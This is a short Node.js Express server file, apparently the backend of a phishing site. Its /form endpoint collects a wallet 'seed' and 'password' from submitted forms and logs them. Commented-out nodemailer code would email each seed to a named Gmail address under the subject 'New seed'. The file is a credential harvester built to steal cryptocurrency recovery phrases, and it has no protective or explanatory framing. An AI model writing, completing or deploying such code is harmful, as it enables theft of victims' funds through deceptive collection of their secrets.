const express = require('express')
const nodemailer = require('nodemailer')
const path = require('path')
const cors = require('cors')
require('dotenv').config()


const app = express()
app.use(cors())
const port = process.env.PORT || 8080

app.use(express.urlencoded({ extended: false }))
app.use(express.json())


if(process.env.NODE_ENV === 'production'){
  app.use(express.static('client/build'))
  app.get('*', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'client', 'build', 'index.html'))  
  })
}

app.post('/form', async(req, res) => {
  const { seed, password } = await req.body
  // const transporter = await nodemailer.createTransport({
  //   service: 'gmail',
  //   auth: {
  //     user: process.env.USER,
  //     pass: process.env.PASSWORD
  //   }
  // })

  // transporter.sendMail({
  //   to: "jtom29544@gmail.com",
  //   subject: "New seed", 
  //   text: {seed},
  // })
  console.log(seed, password)
}) 

app.listen(port, () => {
  console.log(`server started on port ${port}`)
})